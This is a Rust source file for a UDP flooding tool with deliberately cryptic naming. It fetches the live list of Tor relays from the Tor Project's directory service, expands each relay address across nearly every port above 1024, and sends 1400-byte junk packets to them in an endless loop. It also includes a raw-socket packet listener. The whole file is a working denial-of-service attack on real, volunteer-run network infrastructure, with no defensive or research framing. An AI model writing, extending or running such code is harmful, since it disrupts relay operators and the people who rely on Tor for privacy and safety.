use libc::{recvfrom, socket, socklen_t, AF_INET, IPPROTO_UDP, O_NONBLOCK, SOCK_RAW};
use nix::errno::Errno;
use rand::Rng;
use reqwest;
use serde::de::Deserialize;
use serde_json::Deserializer;
use serde_json::Value;
use std::collections::HashMap;
use std::env;
use std::fs::{File,OpenOptions};
use std::io::{BufWriter, Write};
use std::mem;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr, UdpSocket};
use std::os::raw::c_void;
use std::str::FromStr;
use indicatif::ProgressBar;

////ADJUSTMENTS [RESSOURCE HUNGRY]-->DEFAULTS will consume about 65GB RAM.
const START_PORT: u16 = 1024;   //DEFAULT[1024]
const MAX_RELAYS: u8 = 50;      //DEFAULT[50]


const TOR_RELAYS: &str = "https://onionoo.torproject.org/details?type=relay&running=true";


/// Represents an IP address with a netmask.
#[derive(Debug)]
enum IpAddress {
    V4(Ipv4Addr, u8),
    V6(Ipv6Addr, u8),
}

impl IpAddress {
    /// Creates a new `IpAddress` from a string.
    fn from_str(s: &str) -> Option<Self> {
        let parts: Vec<&str> = s.split('/').collect();
        if parts.len() != 2 {
            return None;
        }

        let ip = parts[0];
        let netmask = parts[1];

        let ip = match IpAddr::from_str(ip) {
            Ok(IpAddr::V4(ip)) => IpAddress::V4(ip, 0),
            Ok(IpAddr::V6(ip)) => IpAddress::V6(ip, 0),
            Err(_) => return None,
        };

        let netmask = match netmask.parse::<u8>() {
            Ok(netmask) => netmask,
            Err(_) => return None,
        };

        match ip {
            IpAddress::V4(_, _) => {
                if netmask > 32 {
                    return None;
                }
            }
            IpAddress::V6(_, _) => {
                if netmask > 128 {
                    return None;
                }
            }
        }

        match ip {
            IpAddress::V4(ip, _) => Some(IpAddress::V4(ip, netmask)),
            IpAddress::V6(ip, _) => Some(IpAddress::V6(ip, netmask)),
        }
    }

    /// Returns a vector of IP addresses in the corresponding subnet.
    fn subnet(&self) -> Vec<IpAddr> {
        match self {
            IpAddress::V4(ip, netmask) => {
                let mut addresses = Vec::new();
                let mut current = ip.octets();

                let mut i = 0;
                while i < (1 << (32 - netmask)) {
                    addresses.push(IpAddr::V4(Ipv4Addr::new(
                        current[0], current[1], current[2], current[3],
                    )));
                    current[3] = current[3].wrapping_add(1);
                    if current[3] == 0 {
                        current[2] = current[2].wrapping_add(1);
                        if current[2] == 0 {
                            current[1] = current[1].wrapping_add(1);
                            if current[1] == 0 {
                                current[0] = current[0].wrapping_add(1);
                            }
                        }
                    }
                    i += 1;
                }

                addresses
            }
            IpAddress::V6(ip, netmask) => {
                let mut addresses = Vec::new();
                let mut current = ip.octets();

                let mut i = 0;
                while i < (1 << (128 - netmask)) {
                    addresses.push(IpAddr::V6(Ipv6Addr::new(
                        u16::from_be_bytes([current[0], current[1]]),
                        u16::from_be_bytes([current[2], current[3]]),
                        u16::from_be_bytes([current[4], current[5]]),
                        u16::from_be_bytes([current[6], current[7]]),
                        u16::from_be_bytes([current[8], current[9]]),
                        u16::from_be_bytes([current[10], current[11]]),
                        u16::from_be_bytes([current[12], current[13]]),
                        u16::from_be_bytes([current[14], current[15]]),
                    )));

                    for j in (0..8).rev() {
                        current[j] = current[j].wrapping_add(1);
                        if current[j] != 0 {
                            break;
                        }
                    }
                    i += 1;
                }
                addresses
            }
        }
    }
}

fn generate_random_bytes() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut bytes = Vec::with_capacity(1400);

    let ff_bytes = rng.gen_range(400..=800);

    for _ in 0..(700 - (ff_bytes / 2)) {
        bytes.push(rng.gen::<u8>());
    }

    for _ in 0..ff_bytes {
        bytes.push(0xFF);
    }

    for _ in 0..(700 - (ff_bytes / 2)) {
        bytes.push(rng.gen::<u8>());
    }

    while bytes.len() < 1400 {
        bytes.push(rng.gen::<u8>());
    }

    bytes
}

fn listen_mode() {
    // Create a raw socket
    let socket = unsafe { socket(AF_INET, SOCK_RAW, IPPROTO_UDP) };
    if socket < 0 {
        panic!("Failed to create raw socket");
    }

    // Set the socket to non-blocking mode
    let flags = unsafe { libc::fcntl(socket, libc::F_GETFL) };
    if flags < 0 {
        panic!("Failed to get socket flags");
    }
    let flags = flags | O_NONBLOCK;
    if unsafe { libc::fcntl(socket, libc::F_SETFL, flags) } < 0 {
        panic!("Failed to set socket flags");
    }

    // Bind the socket to a specific interface
    let buffer_size = 1024 * 1024; // 1MB buffer size
    let buffer = buffer_size as libc::c_int;
    // Adding a buffer to the socket.
    unsafe {
        libc::setsockopt(
            socket,
            libc::SOL_SOCKET,
            libc::SO_RCVBUF,
            &buffer as *const _ as *const libc::c_void,
            std::mem::size_of_val(&buffer) as u32,
        );
    }

    // Listen for incoming packets
    loop {
        let mut buf: [u8; 1500] = [0; 1500];
        let mut len = mem::size_of_val(&buf) as socklen_t;
        let res = unsafe {
            recvfrom(
                socket,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                0,
                std::ptr::null_mut(),
                &mut len,
            )
        };

        if res < 0 {
            if Errno::last() == Errno::EAGAIN || Errno::last() == Errno::EWOULDBLOCK {
                // No packets available, try again
                continue;
            } else {
                panic!("Failed to receive packet");
            }
        }

        // Process the packet
        println!("{:?}", String::from_utf8_lossy(&buf[..res as usize]));
    }
}

fn neon_surplus(asses: &HashMap<i32, SocketAddr>) {
    let bar = ProgressBar::new(asses.len() as u64);
    let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to bind socket");
    for (_index, ass) in asses {
        let payload = generate_random_bytes();
        let _ = socket.send_to(&payload, ass);
        bar.inc(1);
    }
    bar.finish();
}

fn zircon(ip: String, port: u16) -> Vec<SocketAddr> {
    let mut neon_glow: Vec<SocketAddr> = vec![];

    if ip.find('/') != None {
        let address_netmask = IpAddress::from_str(&ip).unwrap();
        let subnet_addresses = address_netmask.subnet();

        for address in subnet_addresses {
            let destination = SocketAddr::new(address, port);
            let mut ports = Vec::new();

            for i in 4..(65535 - destination.port() as usize) {
                let mut port_groups = Vec::new();
                let group_size = (i as f64).sqrt().ceil() as usize;
                let group_start = (i / group_size) * group_size;
                let group_end = destination.port() as usize + group_start + group_size - 1;
                for i in group_start + destination.port() as usize..group_end {
                    port_groups.push(i);
                }
                ports.push(port_groups);
            }

            for range in ports {
                for port in range {
                    neon_glow.push(SocketAddr::new(destination.ip(), port as u16));
                }
            }
        }

        // randomize
        let mut supply = HashMap::new();
        for (index, neon) in neon_glow.iter().enumerate() {
            supply.insert(index, *neon);
        }

        neon_glow.clear();
        for (_, neon) in supply {
            neon_glow.push(neon)
        }
    }
    return neon_glow;
}

fn build_tor_relays() -> Vec<Ipv4Addr> {
    let mut relay_addresses: Vec<Ipv4Addr> = vec![];
    let mut diamonds: HashMap<i32, Vec<SocketAddr>> = HashMap::new();
    let mut crushed_diamonds: HashMap<i32, SocketAddr> = HashMap::new();
    match get_tor_relays() {
        Ok(tor_relays) => {
            let mut deserializer = Deserializer::from_slice(&tor_relays);
            let json: Value =
                Value::deserialize(&mut deserializer).expect("Couldn't Deserialize tor relays.");

            let relays = json["relays"].as_array().unwrap();
            let mut count = 0;
            for relay in relays {
                let or_addresses = relay["or_addresses"].as_array().unwrap();
                for or_address in or_addresses {
                    if let Some(ip_address) = or_address.as_str() {
                        if let Ok(sock_address) = ip_address.parse() {
                            if let SocketAddr::V4(sock_address) = sock_address {
                                relay_addresses.push(*sock_address.ip());

                                if count % MAX_RELAYS == 0 && count != 0{
                                    let mut diamond_count = 0;
                                    for _i in 0..MAX_RELAYS{
                                        if let Some(fuel) = relay_addresses.pop(){
                                            let fuel = fuel.to_string() + "/32";
                                            diamonds.insert(diamond_count as i32, zircon(fuel.clone(), START_PORT));
                                            println!("RELAY#{}={}", diamond_count, fuel);
                                        }
                                        diamond_count += 1;
                                    }                
                    
                                    let diamond_filename = &format! {"DIAMOND_{}", count};
                    
                                    let mut crushed_key = 0;
                                    for (_index, diamond) in &diamonds{
                                        for crushed in diamond{
                                            crushed_diamonds.insert(crushed_key, *crushed);
                                            crushed_key += 1;
                                        }
                                    }

                                    let _ = save_socket_addrs_to_file(&diamonds, diamond_filename);
                                    diamonds.clear();

                                    //launch
                                    neon_surplus(&crushed_diamonds);
                                    crushed_diamonds.clear();
                                }
                                count += 1;
                            }
                        }
                    }
                }
            }
        }
        Err(e) => {
            println!("ERROR={}", e);
        }
    }
    relay_addresses
}

#[tokio::main]
async fn get_tor_relays() -> Result<Vec<u8>, reqwest::Error> {
    let url = TOR_RELAYS;
    let mut response = reqwest::get(url).await?;

    let mut tor_relay_json: Vec<u8> = vec![];

    while let Some(chunk) = response.chunk().await? {
        tor_relay_json.extend(chunk);
    }

    println!("Got RELAYS..standby!");

    Ok(tor_relay_json)
}

fn save_socket_addrs_to_file(
    addrs: &HashMap<i32, Vec<SocketAddr>>,
    filename: &str,
) -> std::io::Result<()> {
    let file = File::create(filename)?;
    let mut writer = BufWriter::new(file);

    for (_index, nodes) in addrs {
        for node in nodes {
            writeln!(writer, "{}:{}", node.ip(), node.port())?;
        }
    }

    Ok(())
}

fn save_glowed_addrs_to_file(
    addrs: Vec<Ipv4Addr>,
    filename: &str,
) -> std::io::Result<()> {
    let file = OpenOptions::new()
        .append(true)
        .open(filename)?;

    let mut writer = BufWriter::new(file);
    for node in addrs {
        writeln!(writer, "{}", node.to_string()).unwrap();
    }
    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        return;
    }

    let order = &args[1];

    match order.as_str() {
        "listen" => {
            listen_mode();
        }
        "glow" => {
            loop {
                let glowed = build_tor_relays();
                let _ = save_glowed_addrs_to_file(glowed, "Glowed.txt");
            }
        }
        _ => {
            println!("nope!");
        }
    }
}
